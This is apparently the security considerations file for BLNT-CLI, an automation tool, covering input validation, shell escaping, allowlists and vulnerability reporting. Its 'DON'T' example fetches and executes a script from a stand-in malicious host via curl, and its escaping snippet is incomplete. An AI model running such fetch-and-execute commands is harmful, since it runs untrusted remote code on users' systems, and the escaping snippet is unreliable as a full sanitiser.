# BLNT-CLI Security Considerations

## Overview

BLNT-CLI provides powerful automation capabilities that require careful security considerations. This document outlines security best practices and potential risks.

## Security Features

### 1. Input Validation

**Configuration Management**
- Prototype pollution protection in config.set()
- Dangerous keys (`__proto__`, `constructor`, `prototype`) are blocked
- Prevents malicious configuration injection

**Command Execution**
- Shell command sanitization for clipboard and screenshot operations
- Special characters are escaped before shell execution
- Filenames are validated and sanitized

### 2. Browser Automation

**JavaScript Execution**
- `executeScript()` includes security warnings
- Strict mode can be enabled via `BLNT_STRICT_MODE=true`
- Recommendation to only use trusted script sources

**Browser Isolation**
- Playwright runs in sandboxed environment
- Separate browser context for each session
- No access to host system unless explicitly granted

### 3. Desktop Control

**Command Execution**
- Uses Node.js `child_process` with proper escaping
- Platform-specific command validation
- No shell expansion of wildcards by default

## Known Security Considerations

### High-Risk Operations

1. **JavaScript Execution in Browser**
   - `browser.executeScript()` executes arbitrary code
   - **Risk**: Code injection if user input is not validated
   - **Mitigation**: Only use with trusted scripts

2. **System Command Execution**
   - `desktop.executeCommand()` runs system commands
   - **Risk**: Command injection with malicious input
   - **Mitigation**: Input sanitization, avoid user input

3. **Clipboard Operations**
   - Reading/writing clipboard data
   - **Risk**: Sensitive data exposure
   - **Mitigation**: Secure handling of clipboard content

## Best Practices

### For Users

1. **Verify Script Sources**
   ```bash
   # ❌ DON'T: Execute untrusted scripts
   blnt browser execute -s "$(curl malicious-site.com/script.js)"
   
   # ✅ DO: Review scripts before execution
   cat safe-script.js  # Review first
   blnt browser execute -s "$(cat safe-script.js)"
   ```

2. **Validate User Input**
   ```javascript
   // ❌ DON'T: Use user input directly
   const userInput = getUserInput();
   await desktop.executeCommand(userInput);
   
   // ✅ DO: Validate and sanitize
   const userInput = getUserInput();
   if (!/^[a-zA-Z0-9\-_]+$/.test(userInput)) {
     throw new Error('Invalid input');
   }
   await desktop.executeCommand(`safe-command ${userInput}`);
   ```

3. **Use Configuration Files**
   ```bash
   # Store sensitive data in .env
   # Never commit .env to version control
   echo "API_KEY=secret" >> .env
   ```

4. **Limit Permissions**
   - Run BLNT-CLI with minimum required privileges
   - Don't use sudo/Administrator unless necessary
   - Use separate user accounts for automation

### For Developers

1. **Escape User Input**
   ```typescript
   // Always escape before shell execution
   const escaped = text
     .replace(/"/g, '\\"')
     .replace(/`/g, '\\`')
     .replace(/\$/g, '\\$');
   ```

2. **Validate Configuration Keys**
   ```typescript
   // Block dangerous keys
   const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
   if (dangerousKeys.includes(key)) {
     throw new Error('Invalid key');
   }
   ```

3. **Use Allowlists**
   ```typescript
   // Define allowed commands
   const ALLOWED_COMMANDS = ['ls', 'pwd', 'echo'];
   if (!ALLOWED_COMMANDS.includes(command)) {
     throw new Error('Command not allowed');
   }
   ```

## Environment Variables

Sensitive configuration should use environment variables:

```bash
# .env file (add to .gitignore)
BLNT_STRICT_MODE=true
API_KEY=your_secret_key
```

## Security Checklist

Before deploying BLNT-CLI in production:

- [ ] Review all custom scripts for security issues
- [ ] Validate all user inputs
- [ ] Use environment variables for secrets
- [ ] Enable strict mode when appropriate
- [ ] Run with minimum required privileges
- [ ] Keep dependencies updated
- [ ] Review browser automation for XSS risks
- [ ] Audit command execution paths
- [ ] Test error handling for edge cases
- [ ] Document security requirements

## Vulnerability Reporting

If you discover a security vulnerability:

1. **Do NOT** open a public issue
2. Email security details to the maintainers
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

## Dependency Security

### Regular Updates

```bash
# Check for vulnerabilities
npm audit

# Update dependencies
npm update

# Fix vulnerabilities
npm audit fix
```

### Current Dependencies

All dependencies are from trusted sources:
- Playwright (Microsoft)
- Commander.js (TJ Holowaychuk)
- Inquirer (SBoudrias)
- Chalk (Sindre Sorhus)

## Platform-Specific Security

### macOS
- Requires accessibility permissions for some operations
- Uses system utilities (pbcopy, screencapture)
- Respects macOS security policies

### Linux
- Requires X11 for some operations
- May need additional packages (xclip, import)
- Respects file permissions

### Windows
- PowerShell execution policy may apply
- Some operations require Administrator
- Uses Windows security model

## Secure Development

### Code Review
- All PRs require security review
- Focus on input validation
- Check for command injection
- Review authentication/authorization

### Testing
- Security tests for input validation
- Fuzzing for edge cases
- Penetration testing for critical paths

## Compliance

BLNT-CLI does not:
- Collect user data
- Phone home
- Include telemetry
- Store credentials (except in local config)

## License and Liability

MIT License - See LICENSE file.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Playwright Security](https://playwright.dev/docs/security)

## Updates

This security document is updated with each release. Last updated: 2025-11-01

---

**Remember**: Security is everyone's responsibility. When in doubt, ask!
